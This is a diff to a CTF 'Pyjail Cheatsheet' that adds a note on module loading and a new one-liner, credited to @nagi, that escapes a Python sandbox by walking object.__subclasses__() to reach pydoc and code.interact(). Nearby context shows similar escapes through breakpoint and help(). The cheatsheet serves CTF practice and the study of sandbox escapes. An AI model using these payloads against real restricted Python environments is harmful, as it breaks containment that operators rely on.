@@ -1,6 +1,6 @@
 ---
 title: 'Pyjail Cheatsheet'
-date: '2024-11-24'
+date: '2024-11-27'
 category: 'cheatsheet'
 description: ''
 tags:
@@ -345,6 +345,7 @@ print(delete_me) # error
   - `pdb` - similar to importing pdb
   - `antigravity` - similar to importing antigravity
   - `PROGRAM_NAME` / `jail` / `app` - similar to importing and rerunning program if not wrapped in `if __name__ == "__main__":`
+  - note: loading modules would also add related imported classes to `object.__subclasses__()`
 - see [SECCON Beginners CTF 2022: hitchhike4b](https://github.com/SECCON/Beginners_CTF_2022/blob/main/misc/hitchhike4b/writeup.md)
 
 ```py
@@ -427,6 +428,11 @@ jail
 
 # @maple3142 - overwrite dunder to call breakpoint
 [c:={}.__class__.__subclasses__()[2],b:=c.copy.__builtins__,[-c()for c.items in[b['breakpoint']]]]
+
+# @nagi - calls code.interact() from object.__subclasses__ after triggering pydoc once w/ module containing code.InteractiveInterpreter
+[s:=().__class__.__base__.__subclasses__,s()[158]()(),s()[-3].write.__globals__["interact"]()]
+code
+q
 
 # @keymoon - retrieve help from <class 'enum._EnumDict'>
 {}.__class__.__subclasses__()[3].update.__globals__['bltns'].help()
